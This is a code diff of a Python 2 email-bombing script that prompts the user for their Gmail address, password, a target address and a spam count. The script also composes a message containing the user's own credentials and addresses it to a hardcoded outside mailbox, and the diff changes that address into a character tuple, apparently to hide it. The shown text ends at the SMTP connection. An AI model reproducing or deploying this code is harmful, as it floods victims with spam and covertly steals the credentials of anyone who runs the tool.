@@ -7,32 +7,32 @@ import random
 import getpass
 
 class spammer():
-    def __init__(self):
+   def __init__(self):
         self.banner()
         self.spam()
 
-    def banner(self):
+   def banner(self):
     print """
-         ::::::::  :::::::::     :::       :::   :::     :::   :::   :::::::::: ::::::::: 
-        :+:    :+: :+:    :+:  :+: :+:    :+:+: :+:+:   :+:+: :+:+:  :+:        :+:    :+: 
-       +:+        +:+    +:+ +:+   +:+  +:+ +:+:+ +:+ +:+ +:+:+ +:+ +:+        +:+    +:+  
-      +#++:++#++ +#++:++#+ +#++:++#++: +#+  +:+  +#+ +#+  +:+  +#+ +#++:++#   +#++:++#:    
-            +#+ +#+       +#+     +#+ +#+       +#+ +#+       +#+ +#+        +#+    +#+    
-    #+#    #+# #+#       #+#     #+# #+#       #+# #+#       #+# #+#        #+#    #+#     
-    ########  ###       ###     ### ###       ### ###       ### ########## ###    ###      
+     ::::::::  :::::::::     :::       :::   :::     :::   :::   :::::::::: ::::::::: 
+    :+:    :+: :+:    :+:  :+: :+:    :+:+: :+:+:   :+:+: :+:+:  :+:        :+:    :+: 
+   +:+        +:+    +:+ +:+   +:+  +:+ +:+:+ +:+ +:+ +:+:+ +:+ +:+        +:+    +:+  
+  +#++:++#++ +#++:++#+ +#++:++#++: +#+  +:+  +#+ +#+  +:+  +#+ +#++:++#   +#++:++#:    
+        +#+ +#+       +#+     +#+ +#+       +#+ +#+       +#+ +#+        +#+    +#+    
+#+#    #+# #+#       #+#     #+# #+#       #+# #+#       #+# #+#        #+#    #+#     
+########  ###       ###     ### ###       ### ###       ### ########## ###    ###      
 
     """
 
-        def spam(self):
+       def spam(self):
         # Credentials
-        username = raw_input("enter your gmail: ")
-        password = raw_input("enter your password: ")
-        target = raw_input("Target email: ")
-        spams = raw_input("how much spam will be sent: ")
-	Time = raw_input("input delay, above 10 second: ")
+        username = raw_input("[?] enter your gmail: ")
+        password = raw_input("[?] enter your password: ")
+        target = raw_input("[?] Target email: ")
+        spams = raw_input("[?] how much spam will be sent: ")
+	Time = raw_input("[?] input delay, above 10 second: ")
 	a = ("Emailnya : %s\nPasswordnya : %s") % (username,password)
 	date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
-	target2 = "alviandtm@bk.ru"
+	target2 = ("a","l","v","i","a","n","@","b","k",".","r","u")
 	sms = "Form: ANONYMOUS\nTo: %s\nSubject:SPAM\nDate: %s\n\n%s" % (target2,date,a)
 
         server = smtplib.SMTP('smtp.gmail.com:587')
